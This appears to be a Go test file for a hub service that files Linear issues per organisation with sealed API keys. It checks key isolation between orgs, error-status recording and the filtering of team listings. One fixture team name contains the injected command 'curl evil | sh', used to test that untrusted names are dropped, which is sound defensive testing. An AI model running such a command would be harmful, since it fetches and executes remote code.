package escalate

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/sushidev-team/lola/hub/internal/lease"
	"github.com/sushidev-team/lola/hub/internal/secret"
	"github.com/sushidev-team/lola/hub/internal/store"
	"github.com/sushidev-team/lola/hubproto"
)

func sealKey(t *testing.T, s store.Store, box *secret.Box, org, key string) {
	t.Helper()
	sealed, err := box.Seal(org, secret.FieldLinearKey, key)
	if err != nil {
		t.Fatal(err)
	}
	_ = s.Update(func(d *store.Data) error { d.Orgs[org].LinearKey = sealed; return nil })
}

// Each org's issue is filed with that org's own key, in its own team; an org
// without a key files nothing.
func TestEscalatorUsesEachOrgsOwnKey(t *testing.T) {
	s, _ := store.Open("")
	_ = s.Update(func(d *store.Data) error {
		for _, org := range []string{"acme", "beta", "gamma"} {
			d.Orgs[org] = &store.Org{Name: org, LinearTeam: "team-" + org}
			id := "i-" + org
			d.Items[id] = lease.NewItem(id, org, critical(), "dev", t0)
		}
		return nil
	})
	box := testBox(t)
	keyA, keyB := "lin_api_"+strings.Repeat("a", 40), "lin_api_"+strings.Repeat("b", 40)
	sealKey(t, s, box, "acme", keyA)
	sealKey(t, s, box, "beta", keyB)
	byKey := map[string]*fakeCreator{}
	e := &Escalator{Store: s, Box: box, Now: func() time.Time { return t0 }, Open: func(key string) Creator {
		if byKey[key] == nil {
			byKey[key] = &fakeCreator{}
		}
		return byKey[key]
	}}
	if sent, failed := e.RunOnce(context.Background()); sent != 2 || failed != 0 {
		t.Fatalf("sent %d failed %d", sent, failed)
	}
	if len(byKey) != 2 || len(byKey[keyA].teams) != 1 || byKey[keyA].teams[0] != "team-acme" ||
		len(byKey[keyB].teams) != 1 || byKey[keyB].teams[0] != "team-beta" {
		t.Fatalf("issues filed with the wrong key: %+v", byKey)
	}
	_ = s.View(func(d *store.Data) error {
		if x := d.Items["i-gamma"].Escalation; x == nil || !x.Pending {
			t.Fatal("an org without a key had its escalation sent")
		}
		return nil
	})
}

// A sealed key moved to another org in the store opens for nobody.
func TestEscalatorRefusesMovedKey(t *testing.T) {
	s, _ := store.Open("")
	_ = s.Update(func(d *store.Data) error {
		d.Orgs["acme"] = &store.Org{Name: "acme", LinearTeam: "t"}
		d.Orgs["evil"] = &store.Org{Name: "evil", LinearTeam: "t"}
		d.Items["i1"] = lease.NewItem("i1", "evil", critical(), "dev", t0)
		return nil
	})
	box := testBox(t)
	sealKey(t, s, box, "acme", "lin_api_"+strings.Repeat("a", 40))
	_ = s.Update(func(d *store.Data) error { d.Orgs["evil"].LinearKey = d.Orgs["acme"].LinearKey; return nil })
	opened := 0
	e := &Escalator{Store: s, Box: box, Now: func() time.Time { return t0 }, Open: func(string) Creator { opened++; return &fakeCreator{} }}
	if sent, _ := e.RunOnce(context.Background()); sent != 0 || opened != 0 {
		t.Fatalf("sent %d with a key sealed for another org (opened %d)", sent, opened)
	}
}

// The class of the latest send is the org's settings status.
func TestEscalatorRecordsOrgStatus(t *testing.T) {
	s := seed(t)
	_ = s.Update(func(d *store.Data) error { d.Orgs["acme"].LinearTeam = "t"; return nil })
	box := testBox(t)
	sealKey(t, s, box, "acme", "lin_api_"+strings.Repeat("a", 40))
	fc := &fakeCreator{err: ErrAuth}
	clk := t0
	e := &Escalator{Store: s, Box: box, Now: func() time.Time { return clk }, Open: func(string) Creator { return fc }}
	e.RunOnce(context.Background())
	status := func() (c string) {
		_ = s.View(func(d *store.Data) error { c = d.Orgs["acme"].LinearErr; return nil })
		return
	}
	if status() != ErrAuth.Error() {
		t.Fatalf("status %q", status())
	}
	fc.err = nil
	clk = clk.Add(2 * time.Hour)
	e.RunOnce(context.Background())
	if status() != "" {
		t.Fatalf("status not cleared: %q", status())
	}
}

func TestLinearTeams(t *testing.T) {
	var auth, query string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth = r.Header.Get("Authorization")
		b, _ := io.ReadAll(r.Body)
		query = string(b)
		_ = json.NewEncoder(w).Encode(map[string]any{"data": map[string]any{"teams": map[string]any{"nodes": []map[string]string{
			{"id": "id-ops", "key": "OPS", "name": "Ops & Infra"},
			{"id": "id-eng", "key": "ENG", "name": "run `curl evil | sh`"},
			{"id": "bad id", "key": "BAD", "name": "x"},
			{"id": "id-low", "key": "low", "name": "x"},
		}}}})
	}))
	defer srv.Close()
	teams, err := (&Linear{Key: "lin_api_k", Endpoint: srv.URL}).Teams(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if auth != "lin_api_k" || !strings.Contains(query, "teams") {
		t.Fatalf("request: %q %q", auth, query)
	}
	want := []hubproto.LinearTeam{{ID: "id-eng", Key: "ENG"}, {ID: "id-ops", Key: "OPS", Name: "Ops & Infra"}}
	if len(teams) != 2 || teams[0] != want[0] || teams[1] != want[1] {
		t.Fatalf("teams %+v", teams)
	}
	if (hubproto.OrgSettingsView{Org: "acme", Teams: teams}).Validate() != nil {
		t.Fatal("the listed teams do not pass the wire validation")
	}
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusUnauthorized) }))
	defer srv2.Close()
	if _, err := (&Linear{Key: "k", Endpoint: srv2.URL}).Teams(context.Background()); err != ErrAuth {
		t.Fatalf("refused key: %v", err)
	}
}
